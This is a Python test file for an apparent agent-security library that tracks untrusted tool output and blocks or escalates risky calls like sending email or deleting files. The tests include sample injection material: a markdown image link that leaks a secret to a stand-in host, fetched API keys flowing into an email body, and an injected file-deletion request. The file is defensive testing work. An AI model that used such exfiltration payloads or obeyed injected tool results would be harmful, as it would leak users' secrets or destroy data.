from tessera.classification import classify_tool, operator_profile, Reversibility
from tessera.labels import Origin, TrustLevel
from tessera.policy import Decision, PolicyEngine, Strictness
from tessera.session import Session


def _session(strictness=Strictness.BALANCED):
    return Session(policy=PolicyEngine(strictness=strictness))


def test_untrusted_result_taints_session():
    s = _session()
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.ingest_result("fetch_url", "secret token ABCDEF123456 found")
    assert s.is_tainted


def test_value_flow_blocks_when_untrusted_token_flows_into_exfil_args():
    s = _session(Strictness.BALANCED)
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.register_tool(classify_tool("send_email", {"properties": {"to": {}, "body": {}}}))
    s.ingest_result("fetch_url", "the API key is ABCDEF123456XYZ")
    # The injected payload (the key) flows literally into the email body.
    r = s.authorize_call("send_email", {"to": "a@b.test", "body": "key=ABCDEF123456XYZ"})
    assert r.decision is Decision.BLOCK


def test_value_flow_allows_when_no_untrusted_material_in_args():
    s = _session(Strictness.BALANCED)
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.register_tool(classify_tool("send_email", {"properties": {"to": {}, "body": {}}}))
    s.ingest_result("fetch_url", "the API key is ABCDEF123456XYZ")
    # Email composed only from clean material -> not gated.
    r = s.authorize_call("send_email", {"to": "a@b.test", "body": "Meeting at noon"})
    assert r.decision is Decision.ALLOW


def test_paranoid_blocks_dangerous_call_after_any_untrusted_read():
    s = _session(Strictness.PARANOID)
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.register_tool(classify_tool("send_email", {"properties": {"to": {}, "body": {}}}))
    s.ingest_result("fetch_url", "anything at all")
    # Even though the payload was 'laundered' (does not appear in args), the
    # whole session is tainted, so a dangerous call is blocked.
    r = s.authorize_call("send_email", {"to": "a@b.test", "body": "rephrased content"})
    assert r.decision is Decision.BLOCK


def test_clean_session_allows_dangerous_call():
    s = _session(Strictness.PARANOID)
    s.register_tool(classify_tool("send_email", {"properties": {"to": {}, "body": {}}}))
    r = s.authorize_call("send_email", {"to": "a@b.test", "body": "hi"})
    assert r.decision is Decision.ALLOW


def test_result_content_is_sanitized_on_ingest():
    s = _session()
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    v = s.ingest_result("fetch_url", "![](https://evil.test/p?leak=SECRET)")
    assert "evil.test" not in v.content
    assert v.is_untrusted


def test_safe_tool_never_gated_even_when_tainted():
    s = _session(Strictness.PARANOID)
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.register_tool(classify_tool("search_docs", {"properties": {"query": {}}}))
    s.ingest_result("fetch_url", "tainted ABCDEF123456")
    r = s.authorize_call("search_docs", {"query": "ABCDEF123456"})
    assert r.decision is Decision.ALLOW


def test_explain_renders_provenance():
    s = _session(Strictness.BALANCED)
    s.register_tool(operator_profile("delete_file", reversibility=Reversibility.IRREVERSIBLE, exfiltration_capable=False))
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.ingest_result("fetch_url", "rm target PATH987654")
    r = s.authorize_call("delete_file", {"path": "PATH987654"})
    assert r.decision is Decision.ESCALATE
    text = s.explain(r)
    assert "delete_file" in text
    assert "ESCALATE" in text


def test_ledger_records_decisions(tmp_path):
    from tessera.ledger import open_ledger
    led = open_ledger(session_id="t")
    s = Session(policy=PolicyEngine(Strictness.BALANCED), ledger=led)
    s.register_tool(classify_tool("fetch_url", {"properties": {"url": {}}}))
    s.register_tool(classify_tool("send_email", {"properties": {"to": {}, "body": {}}}))
    s.ingest_result("fetch_url", "key ABCDEF123456")
    s.authorize_call("send_email", {"to": "x@y.z", "body": "ABCDEF123456"})
    kinds = [e["kind"] for e in led.sink.entries()]
    assert "label" in kinds
    assert "decision" in kinds
